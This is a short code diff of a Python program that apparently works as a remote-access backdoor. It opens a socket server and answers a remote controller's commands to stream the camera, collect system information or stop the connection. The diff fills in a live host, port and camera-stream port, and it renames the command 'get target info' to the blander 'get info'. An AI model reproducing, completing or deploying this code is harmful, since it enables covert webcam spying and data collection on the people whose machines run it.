@@ -6,9 +6,10 @@ import requests
 import json
 import threading
 
-HOST = ""
-PORT = 0000
-CameraStreamingPort = 0
+HOST = socket.gethostbyname(socket.gethostname())
+PORT = 1827
+CameraStreamingPort = 8989
+
 try :
     from vidstream import CameraClient
 except:
@@ -109,14 +110,13 @@ class Server (object) :
                     SERVER_TO_CONNECT.send(f"{Splus} {CR.green()}Done{CR.white()}".encode())
                 elif STATIC == False:
                     SERVER_TO_CONNECT.send(f"{Sminess} {CR.green()}no need to stop the {CR.blue()}Stream {CR.green()}it not running{CR.white()}".encode())
-            elif DATA_RECV == "get target info":
+            elif DATA_RECV == "get info":
                 GettingInfoOfTheSystem(
                     __server__=SERVER_TO_CONNECT
                 )
             elif DATA_RECV == "stop connection":
                 SERVER_TO_CONNECT.close()
                 sys.exit()
-
 
 start_Server = Server
 start_Server.SocketThing(
